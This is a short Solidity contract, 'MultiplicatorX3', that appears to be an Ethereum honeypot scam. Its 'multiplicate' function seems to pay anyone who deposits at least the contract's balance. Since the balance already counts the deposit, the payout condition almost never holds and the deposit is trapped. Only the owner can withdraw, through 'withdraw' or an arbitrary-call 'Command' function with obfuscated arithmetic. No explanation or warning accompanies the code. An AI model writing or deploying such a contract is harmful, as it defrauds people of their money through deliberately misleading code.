pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value((10**3)*(10**18)/(10**18)*msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=(this.balance*1)/1)
        {        
            adr.transfer((this.balance+msg.value)-0);
        }
    }
}